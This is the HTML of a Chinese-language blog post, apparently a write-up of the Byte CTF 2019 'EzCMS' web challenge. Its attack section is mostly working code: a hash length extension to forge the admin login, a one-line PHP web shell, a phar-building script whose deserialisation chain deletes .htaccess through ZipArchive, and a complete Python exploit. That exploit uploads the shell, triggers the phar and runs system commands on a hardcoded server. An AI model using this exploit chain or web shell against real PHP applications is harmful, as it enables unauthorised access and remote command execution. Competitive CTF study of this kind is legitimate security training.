@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&#x2F;www.zip有源码。 哈希长度扩展攻击检查admin密码：&#x2F;config.php给出md5($secret.&amp;#39;adminadmin&amp;#39;)===&amp;#39;52107b08c0f3342d2153ae1d68e6262c&amp;#39;很明显要哈希长度扩展攻击，在密码后扩展 上传shell尽管.htaccess限制着，shell还是可以上传的。&amp;lt;?php @$_REQUEST[f](">
+<meta name="keywords" content="bytectf2019,web,php,length-extension-attack,unserialze,ZipArchive">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Byte CTF 2019 - EzCMS (Web)">
+<meta property="og:url" content="https:&#x2F;&#x2F;lanceaking.github.io&#x2F;2019&#x2F;09&#x2F;08&#x2F;Byte-CTF-2019-EzCMS-Web&#x2F;index.html">
+<meta property="og:site_name" content="LanceaKing&#39;s Blog">
+<meta property="og:description" content="&#x2F;www.zip有源码。 哈希长度扩展攻击检查admin密码：&#x2F;config.php给出md5($secret.&amp;#39;adminadmin&amp;#39;)===&amp;#39;52107b08c0f3342d2153ae1d68e6262c&amp;#39;很明显要哈希长度扩展攻击，在密码后扩展 上传shell尽管.htaccess限制着，shell还是可以上传的。&amp;lt;?php @$_REQUEST[f](">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751653ab644162bb0074c4">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d7519b8ab644162bb007581">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751aa0ab644160a90074ce">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751bd6ab644162bb0075f2">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751e59ab644162bb00768b">
+<meta property="og:updated_time" content="2019-10-27T15:57:56.508Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751653ab644162bb0074c4">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Byte CTF 2019 - EzCMS (Web)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/08/Byte-CTF-2019-rss-Web/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/09/08/Byte-CTF-2019-boring-code-Web/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&text=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&is_video=false&description=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Byte CTF 2019 - EzCMS (Web)&body=Check out this article: https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&name=Byte CTF 2019 - EzCMS (Web)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#哈希长度扩展攻击"><span class="toc-number">1.</span> <span class="toc-text">哈希长度扩展攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传shell"><span class="toc-number">2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞删除-htaccess"><span class="toc-number">3.</span> <span class="toc-text">反序列化漏洞删除.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#生成phar"><span class="toc-number">4.</span> <span class="toc-text">生成phar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Byte CTF 2019 - EzCMS (Web)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LanceaKing's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-08T14:51:07.000Z" itemprop="datePublished">2019-09-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/writeups/">writeups</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ZipArchive/" rel="tag">ZipArchive</a>, <a class="tag-link" href="/tags/bytectf2019/" rel="tag">bytectf2019</a>, <a class="tag-link" href="/tags/length-extension-attack/" rel="tag">length-extension-attack</a>, <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/unserialze/" rel="tag">unserialze</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><code>/www.zip</code>有源码。</p>
+<h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><p>检查admin密码：<br>/config.php<br><img src="https://leanote.com/api/file/getImage?fileId=5d751653ab644162bb0074c4" alt="title"><br>给出<code>md5($secret.&#39;adminadmin&#39;)===&#39;52107b08c0f3342d2153ae1d68e6262c&#39;</code><br>很明显要哈希长度扩展攻击，在密码后扩展</p>
+<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><p>尽管.htaccess限制着，shell还是可以上传的。<br><code>&lt;?php @$_REQUEST[f]($_REQUEST[x]);</code>就能绕过$black_list。</p>
+<h2 id="反序列化漏洞删除-htaccess"><a href="#反序列化漏洞删除-htaccess" class="headerlink" title="反序列化漏洞删除.htaccess"></a>反序列化漏洞删除.htaccess</h2><p>这里出现了反序列化漏洞：<br><img src="https://leanote.com/api/file/getImage?fileId=5d7519b8ab644162bb007581" alt="title"><br><code>mime_content_type()</code>如果路径是phar协议的话会对phar文件里的metadata反序列化。反序列化魔术方法只有<code>File::__destruct</code>：<br><img src="https://leanote.com/api/file/getImage?fileId=5d751aa0ab644160a90074ce" alt="title"><br>看起来<code>File::checker = Admin</code>，但是还有另一处可疑的地方：<br><code>Profile::__call</code><br><img src="https://leanote.com/api/file/getImage?fileId=5d751bd6ab644162bb0075f2" alt="title"><br><code>ZipArchive::open</code>恰好有两个参数，并且可以用来删除文件：<br><img src="https://leanote.com/api/file/getImage?fileId=5d751e59ab644162bb00768b" alt="title"><br>所以正确的是<code>Profile::admin = ZipArchive; File::checker = Profile</code></p>
+<p>phar协议绕过正则只需在前面加php协议：<code>php://filter/convert.base64-encode/resource=phar://...</code></p>
+<h2 id="生成phar"><a href="#生成phar" class="headerlink" title="生成phar"></a>生成phar</h2><figure class="highlight php"><figcaption><span>phar.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __destruct() &#123;</span></span><br><span class="line">    <span class="comment">//     if (isset($this-&gt;checker)) &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;checker-&gt;upload_file();</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// delete .htaccess</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'/var/www/html/sandbox/03bc7306053517499b851326b9bcdeeb/.htaccess'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __call($name, $arguments)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php var_dump('HaHa!'); __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>删除文件的路径一定是绝对路径，不然删不了。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><figcaption><span>exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashpumpy <span class="keyword">import</span> hashpump</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">'http://112.126.102.158:9999'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># crack password</span></span><br><span class="line">username = password = <span class="string">'admin'</span></span><br><span class="line">h1 = <span class="string">'52107b08c0f3342d2153ae1d68e6262c'</span></span><br><span class="line">d1 = username + password</span><br><span class="line">sn = <span class="number">8</span></span><br><span class="line">h2, d2 = hashpump(h1, d1, <span class="string">'a'</span>, sn)</span><br><span class="line">password = d2[len(username):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'username: '</span> + username</span><br><span class="line"><span class="keyword">print</span> <span class="string">'password: '</span> + quote(password)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'cookie: user='</span> + h2</span><br><span class="line"></span><br><span class="line">sess = Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">sess.cookies.set(<span class="string">'user'</span>, h2)</span><br><span class="line">data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">sess.post(BASE + <span class="string">'/index.php'</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># upload shell</span></span><br><span class="line">shell = <span class="string">'shell.php'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: (shell, <span class="string">'&lt;?php @$_REQUEST[f]($_REQUEST[x]);'</span>)&#125;</span><br><span class="line">sess.post(BASE + <span class="string">'/upload.php'</span>, files=files)</span><br><span class="line">shellpath = md5(shell).hexdigest() + <span class="string">'.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete .htaccess</span></span><br><span class="line">phar = <span class="string">'phar.phar'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(phar, <span class="string">'rb'</span>)&#125;</span><br><span class="line">sess.post(BASE + <span class="string">'/upload.php'</span>, files=files)</span><br><span class="line">filename = md5(phar).hexdigest() + <span class="string">'.phar'</span></span><br><span class="line">filepath = (</span><br><span class="line">    <span class="string">'php://filter/convert.base64-encode/resource='</span></span><br><span class="line">    <span class="string">'phar://./sandbox/03bc7306053517499b851326b9bcdeeb/%s/test.txt'</span> % filename)</span><br><span class="line">params = &#123;<span class="string">'filename'</span>: filename, <span class="string">'filepath'</span>: filepath&#125;</span><br><span class="line">sess.get(BASE + <span class="string">'/view.php'</span>, params=params)</span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">'f'</span>: <span class="string">'system'</span>, <span class="string">'x'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line">r = sess.get(</span><br><span class="line">    BASE + <span class="string">'/sandbox/03bc7306053517499b851326b9bcdeeb/'</span> + shellpath,</span><br><span class="line">    params=params)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#哈希长度扩展攻击"><span class="toc-number">1.</span> <span class="toc-text">哈希长度扩展攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传shell"><span class="toc-number">2.</span> <span class="toc-text">上传shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞删除-htaccess"><span class="toc-number">3.</span> <span class="toc-text">反序列化漏洞删除.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#生成phar"><span class="toc-number">4.</span> <span class="toc-text">生成phar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&text=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&is_video=false&description=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Byte CTF 2019 - EzCMS (Web)&body=Check out this article: https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&title=Byte CTF 2019 - EzCMS (Web)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-EzCMS-Web/&name=Byte CTF 2019 - EzCMS (Web)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LanceaKing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
